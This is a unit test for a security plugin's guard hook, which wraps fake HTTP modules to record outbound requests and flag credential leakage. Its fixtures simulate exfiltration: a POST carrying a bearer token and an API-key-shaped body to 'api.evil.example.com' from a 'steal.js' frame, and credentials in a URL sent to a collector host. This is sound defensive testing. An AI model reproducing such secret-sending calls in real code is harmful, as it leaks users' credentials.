/**
 * dsh-security-doctor — guard-hook unit test (v1.0.0).
 *
 * Drives lib/guard.js DIRECTLY with fake http/https modules (no real network,
 * no patching of the real node builtins): default-off contract, wrap/unwrap
 * round-trip, record shape for every call form (string URL, URL object,
 * options object, options-with-headers), credential header/body flagging,
 * best-effort stack attribution (own-plugin frames skipped, scoped packages
 * resolved, harness-core fallback), ring-buffer cap, and the "auditing must
 * never break the audited call" invariant when stackOf() throws.
 * Run with:
 *
 *   node test/guard.mjs
 */

import assert from 'node:assert/strict'
import { createGuard } from '../lib/guard.js'

/** Fake module + fake ClientRequest: records original calls, lets tests drive req.write. */
function fakeModule(tag) {
  const calls = []
  const makeReq = (args) => ({
    writes: [],
    write(chunk, ...rest) { this.writes.push(chunk); return { ok: true, rest, tag } },
    end() {},
  })
  return {
    calls,
    request(...args) { calls.push(['request', args]); return makeReq(args) },
    get(...args) { calls.push(['get', args]); return makeReq(args) },
  }
}

const T0 = '2026-08-19T12:00:00.000Z'
let clock = 0
const now = () => new Date(T0).toISOString() + '#' + (++clock)
let stackScript = null // () => string

const http = fakeModule('http')
const https = fakeModule('https')
const guard = createGuard({
  http, https, now,
  stackOf: () => (stackScript ? stackScript() : 'Error\n    at Object.<anonymous> (/harness/apps/cli/src/main.ts:1:1)'),
  limit: 3,
})

function main() {
  // ── default OFF: no wrapping, no records, factory is inert ──
  assert.equal(guard.enabled, false, 'guard starts disabled')
  const httpReqOriginal = http.request
  const httpGetOriginal = http.get
  const httpsReqOriginal = https.request
  assert.deepEqual(guard.records(), [], 'no records before enable')

  // enabling while disabled wraps all four exports exactly once
  guard.enable()
  assert.equal(guard.enabled, true)
  assert.notEqual(http.request, httpReqOriginal, 'http.request wrapped')
  assert.notEqual(http.get, httpGetOriginal, 'http.get wrapped')
  assert.notEqual(https.request, httpsReqOriginal, 'https.request wrapped')
  assert.notEqual(https.get, https.request, 'https.get wrapped separately (its internal request ref bypasses our http patch)')

  // double-enable must not double-wrap (the same original stays reachable)
  guard.enable()
  http.request('http://a.example.com/')
  assert.equal(guard.records().length, 1, 'double enable adds no extra wrapper')

  // ── record shape: string URL + options (method + credential header) ──
  stackScript = () => 'Error\n    at Object.<anonymous> (D:\\h\\node_modules\\dsh-sus-demo\\lib\\steal.js:3:9)'
  const req1 = https.request('https://api.evil.example.com/v1/data', {
    method: 'POST',
    headers: { Authorization: 'Bearer abc', 'content-type': 'application/json' },
  })
  let rec = guard.records().pop()
  assert.equal(rec.host, 'api.evil.example.com', 'hostname from the URL string')
  assert.equal(rec.method, 'POST', 'method from options')
  assert.equal(rec.credHeaders, true, 'Authorization header flagged')
  assert.equal(rec.credBody, false, 'no body sniffed yet')
  assert.equal(rec.plugin, 'dsh-sus-demo', 'attribution from the call stack')
  assert.equal(typeof rec.at, 'string')

  // credential-like body on the FIRST write flips the flag; the write passes through
  req1.write('{"key":"sk-abcdefghijklmnopqrstuv","v":1}')
  rec = guard.records().pop()
  assert.equal(rec.credBody, true, 'credential-shaped body chunk flagged (shape only, never stored)')
  // a second write is not re-sniffed (first chunk decides)
  req1.write('token=abcdefghijklmnopqrstuvwxyz123456')
  assert.equal(guard.records().pop().credBody, true)

  // ── clean body: header-level info only ──
  const req2 = http.request({ hostname: 'charts.example.com', port: 8080, method: 'put' })
  req2.write('{"query":"weather today"}')
  rec = guard.records().pop()
  assert.equal(rec.host, 'charts.example.com', 'hostname from options; port stripped')
  assert.equal(rec.method, 'PUT', 'method upper-cased')
  assert.equal(rec.credHeaders, false)
  assert.equal(rec.credBody, false, 'ordinary body stays unflagged')

  // ── URL object + URL-embedded credentials + cookie array form ──
  const req3 = https.request(new URL('https://key:secret@collector.example.com/report'), {
    headers: ['Cookie', 'session=abc', 'X-Api-Key', 'zzz'],
  })
  req3.end()
  rec = guard.records().pop()
  assert.equal(rec.host, 'collector.example.com', 'URL-object form recognized')
  assert.equal(rec.credHeaders, true, 'URL userinfo AND raw header array both flagged')

  // http.get goes through its own wrapper (the internal request ref would bypass)
  http.get('http://ping.example.com/health')
  rec = guard.records().pop()
  assert.equal(rec.host, 'ping.example.com')
  assert.equal(rec.method, 'GET', 'default method')

  // ── attribution fallbacks ──
  // own-plugin frames are skipped: a deeper foreign frame still attributes
  stackScript = () => 'Error\n    at wrapped (D:\\h\\node_modules\\dsh-security-doctor\\lib\\guard.js:10:1)\n    at run (D:\\h\\node_modules\\@evil\\scope-pkg\\index.js:2:1)'
  https.request('https://s.example.com/')
  assert.equal(guard.records().pop().plugin, '@evil/scope-pkg', 'scoped package resolved, own wrapper frame skipped')

  // harness core (no node_modules frame) → null → rendered as "(host)" by the UI
  stackScript = () => 'Error\n    at Object.<anonymous> (/harness/apps/cli/src/main.ts:1:1)'
  https.request('https://h.example.com/')
  assert.equal(guard.records().pop().plugin, null, 'harness-core frames attribute to null')

  // ── auditing must never break the audited call ──
  stackScript = () => { throw new Error('stack capture exploded') }
  const before = https.calls.length
  const recsBefore = guard.records().length
  const reqBoom = https.request('https://still-works.example.com/x', { method: 'DELETE' })
  assert.equal(https.calls.length, before + 1, 'original still invoked when the audit path throws')
  assert.ok(reqBoom && typeof reqBoom.write === 'function')
  assert.equal(guard.records().length, recsBefore, 'a broken stack capture adds no record')

  // ── ring buffer cap (limit: 3): oldest dropped ──
  stackScript = null
  guard.records().length = 0
  for (const host of ['h1.example.com', 'h2.example.com', 'h3.example.com', 'h4.example.com']) {
    https.request('https://' + host + '/')
  }
  const tail = guard.records()
  assert.equal(tail.length, 3, 'ring buffer capped at the configured limit')
  assert.deepEqual(tail.map((r) => r.host), ['h2.example.com', 'h3.example.com', 'h4.example.com'], 'oldest records dropped first')

  // ── disable: unwraps everything, keeps records, re-enable works ──
  guard.disable()
  assert.equal(guard.enabled, false)
  assert.equal(http.request, httpReqOriginal, 'http.request restored')
  assert.equal(http.get, httpGetOriginal, 'http.get restored')
  assert.equal(https.request, httpsReqOriginal, 'https.request restored')
  assert.equal(guard.records().length, 3, 'records survive disable (still viewable)')
  https.request('https://invisible.example.com/')
  assert.equal(guard.records().length, 3, 'unwrapped calls are no longer recorded')

  guard.enable()
  assert.notEqual(https.request, httpsReqOriginal, 're-enable wraps again')
  guard.disable()
  assert.equal(https.request, httpsReqOriginal, 'second disable restores again')

  console.log('GUARD OK — wrap/unwrap round-trip, attribution, credential flags, ring buffer', '(limit', guard.limit + ')')
}

main()
